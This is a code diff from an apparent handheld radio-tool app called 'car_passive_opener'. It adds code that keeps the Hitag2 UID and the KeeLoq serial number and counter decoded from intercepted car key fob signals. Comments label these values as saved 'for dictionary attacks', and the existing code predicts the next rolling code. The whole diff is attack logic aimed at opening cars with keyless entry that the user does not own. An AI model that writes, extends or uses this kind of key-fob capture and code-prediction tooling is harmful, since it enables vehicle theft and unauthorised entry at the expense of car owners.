@@ -257,8 +257,17 @@ static void car_passive_opener_ui_timer_callback(void* context) {
                         if(decode_success) {
                             passive_state.decoded_counter = hitag2_response & 0xFFFF;
                             passive_state.predicted_next = passive_state.decoded_counter + 1;
+                            
+                            // PROFESSIONAL: Save Hitag2 UID for dictionary attacks
+                            app->has_captured_uid = true;
+                            app->captured_uid = passive_state.hitag2_ctx.key_uid;
+                            app->captured_counter = passive_state.decoded_counter;
+                            app->captured_frequency = app->selected_model_freq;
+                            
                             FURI_LOG_I("PassiveOpener", "[REAL CRYPTO] Hitag2 LFSR decoded: 0x%04lX", 
                                       passive_state.decoded_counter);
+                            FURI_LOG_I("PassiveOpener", "[CAPTURED] UID=0x%016llX for dictionary attacks", 
+                                      app->captured_uid);
                         } else {
                             // Fallback if crypto fails
                             passive_state.decoded_counter = captured_signal & 0xFFFF;
@@ -289,6 +298,16 @@ static void car_passive_opener_ui_timer_callback(void* context) {
                         // Extract counter from decrypted Keeloq packet (bits 16-27)
                         passive_state.decoded_counter = (decrypted_data >> 16) & 0x0FFF;
                         passive_state.keeloq_ctx.counter = passive_state.decoded_counter;
+                        
+                        // PROFESSIONAL: Extract and save serial number for dictionary attacks
+                        uint32_t extracted_serial = decrypted_data & 0xFFFFFF; // Lower 24 bits
+                        app->has_captured_serial = true;
+                        app->captured_serial = extracted_serial;
+                        app->captured_counter = passive_state.decoded_counter;
+                        app->captured_frequency = app->selected_model_freq;
+                        
+                        FURI_LOG_I("PassiveOpener", "[CAPTURED] Serial=0x%06lX for dictionary attacks", 
+                                  extracted_serial);
                         
                         // Predict next using REAL Keeloq encryption
                         uint32_t next_plaintext = decrypted_data + (1 << 16); // Increment counter
